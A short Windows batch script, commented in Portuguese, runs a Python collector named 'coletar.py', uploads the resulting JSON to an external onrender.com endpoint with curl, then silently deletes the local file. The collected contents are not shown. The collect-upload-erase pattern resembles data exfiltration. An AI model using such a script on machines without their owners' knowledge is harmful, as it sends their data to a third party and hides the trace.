@echo off
setlocal enabledelayedexpansion

REM Coleta informações
python coletar.py > dados.json

REM Envia para servidor
curl -X POST -H "Content-Type: application/json" -d @dados.json https://huss-w2h3.onrender.com/receber

REM Limpa
del dados.json >nul 2>&1

exit
